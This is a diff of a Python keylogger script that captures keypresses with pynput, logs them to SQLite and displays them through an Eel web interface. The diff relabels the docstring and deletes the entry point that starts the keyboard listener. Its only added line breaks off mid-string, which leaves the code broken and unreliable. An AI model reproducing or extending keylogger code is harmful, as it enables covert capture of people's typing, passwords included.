@@ -1,6 +1,5 @@
-
 """
-Keylogger Application
+Keylogger Application (Expanded Version)
 
 This script initializes a keylogger using the pynput library and logs all keypress events to a local SQLite database.
 It also uses the Eel library to interact with a frontend UI built in HTML/JS/CSS.
@@ -110,22 +109,4 @@ def fetch_keystrokes():
         results = cursor.fetchall()
         return results
     except Exception as e:
-        logging.error(f"Error fetching keystrokes: {e}")
-        return []
-    finally:
-        conn.close()
-
-# ==========================
-# Application Entry Point
-# ==========================
-
-def main():
-    """Main function to start Eel and the keylogger listener."""
-    setup_database()
-    eel.init('web')
-    eel.start('index.html', block=False)
-    with keyboard.Listener(on_press=on_press) as listener:
-        eel.loop.run_forever()
-
-if __name__ == '__main__':
-    main()
+        logging.error(f"Error fetching ke
